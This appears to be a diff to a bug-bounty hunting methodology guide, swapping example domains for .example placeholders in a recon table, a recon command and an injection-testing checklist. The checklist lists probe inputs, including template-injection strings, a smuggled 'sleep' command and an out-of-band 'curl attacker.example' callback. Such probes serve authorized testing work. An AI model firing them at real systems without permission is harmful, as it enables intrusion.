@@ -159,7 +159,7 @@ Before touching any tool:
 | Signal | Wide (recon sweep) | Deep (focused testing) |
 |--------|-------------------|----------------------|
 | New program, first day | X | |
-| Wildcard scope `*.target.com` | X | |
+| Wildcard scope `*.target.example` | X | |
 | Main webapp, been here >3 days | | X |
 | Scope update (new domain added) | X | |
 | Found interesting subdomain | | X |
@@ -185,7 +185,7 @@ Google Dorks -> JS file download -> Hidden param discovery -> API mapping
 | Cloud resources (S3, Firebase) | Test permissions (read/write/list) |
 | Nothing after 5 min on a host | Skip, try next host (5-minute rule) |
 
-**Command**: `/recon target.com`
+**Command**: `/recon target.example`
 
 ### Phase 2: MAPPING & ANALYSIS
 
@@ -240,7 +240,7 @@ What input are you testing?
 **Error vs Blind decision:**
 1. Try Error-based first (send `'`, `"`, `{{7*7}}`, `${7*7}`) -- watch for 500 errors, stack traces
 2. No error? Time-based (`SLEEP(10)`, `; sleep 10;`) -- watch response time
-3. No time diff? OOB (`curl attacker.com`, interactsh) -- watch for DNS callback
+3. No time diff? OOB (`curl attacker.example`, interactsh) -- watch for DNS callback
 4. Still nothing? Boolean (`AND 1=1` vs `AND 1=0`) -- watch content-length diff
 
 | What you find | Next action |
